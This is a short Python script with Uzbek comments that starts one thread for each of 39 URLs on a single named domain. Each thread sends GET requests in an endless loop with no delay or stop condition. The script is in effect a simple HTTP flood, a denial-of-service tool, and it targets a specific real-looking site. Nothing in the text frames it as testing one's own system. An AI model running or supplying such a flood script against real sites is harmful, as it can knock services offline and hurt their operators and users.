import requests
import threading


urls = [
    "http://shaxzodbek.com",
    "http://shaxzodbek.com/page2",
    "http://shaxzodbek.com/page3",
    "http://shaxzodbek.com/api",
    "http://shaxzodbek.com/pages",
    "http://shaxzodbek.com/home",
    "http://shaxzodbek.com/aboutme",
    "http://shaxzodbek.com/contact",
    "http://shaxzodbek.com/api/users",
    "http://shaxzodbek.com/api/posts",
    "http://shaxzodbek.com/api/comments",
    "http://shaxzodbek.com/api/likes",
    "http://shaxzodbek.com/api/followers",
    "http://shaxzodbek.com/api/following",
    "http://shaxzodbek.com/api/friends",
    "http://shaxzodbek.com/api/messages",
    "http://shaxzodbek.com/api/chats",
    "http://shaxzodbek.com/api/groups",
    "http://shaxzodbek.com/api/notifications",
    "http://shaxzodbek.com/api/settings",
    "http://shaxzodbek.com/api/profile",
    "http://shaxzodbek.com/api/account",
    "http://shaxzodbek.com/api/auth",
    "http://shaxzodbek.com/api/login",
    "http://shaxzodbek.com/api/register",
    "http://shaxzodbek.com/api/logout",
    "http://shaxzodbek.com/api/verify",
    "http://shaxzodbek.com/api/password",
    "http://shaxzodbek.com/api/reset",
    "http://shaxzodbek.com/api/confirm",
    "http://shaxzodbek.com/api/activate",
    "http://shaxzodbek.com/api/deactivate",
    "http://shaxzodbek.com/api/delete",
    "http://shaxzodbek.com/api/ban",
    "http://shaxzodbek.com/api/unban",
    "http://shaxzodbek.com/api/block",
    "http://shaxzodbek.com/api/unblock",
    "http://shaxzodbek.com/api/report",
    "http://shaxzodbek.com/api/feedback"
]

# Har bir URL-ga GET so‘rov yuborish funksiyasi
def send_get_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"GET yuborildi: {url}, Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"Xatolik yuz berdi: {url}")

# Ko‘p tarmoqli GET so‘rov yuborish
for url in urls:
    thread = threading.Thread(target=send_get_request, args=(url,))
    thread.start()
